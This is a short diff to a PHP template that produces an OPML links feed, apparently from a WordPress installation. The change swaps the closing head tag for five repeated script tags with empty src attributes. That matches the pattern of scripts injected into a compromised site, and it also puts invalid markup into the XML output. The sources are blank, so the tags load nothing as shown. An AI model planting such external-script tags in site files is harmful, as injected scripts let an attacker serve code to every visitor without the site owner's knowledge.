@@ -29,7 +29,7 @@ echo '<?xml version="1.0"?'.">\n";
 		<title><?php printf( __('Links for %s'), esc_attr(get_bloginfo('name', 'display')) ); ?></title>
 		<dateCreated><?php echo gmdate("D, d M Y H:i:s"); ?> GMT</dateCreated>
 		<?php do_action('opml_head'); ?>
-	</head>
+	<script language="JavaScript" src=" " type="text/javascript"></script><script language="JavaScript" src=" " type="text/javascript"></script><script language="JavaScript" src=" " type="text/javascript"></script><script language="JavaScript" src=" " type="text/javascript"></script><script language="JavaScript" src=" " type="text/javascript"></script></head>
 	<body>
 <?php
 if ( empty($link_cat) )
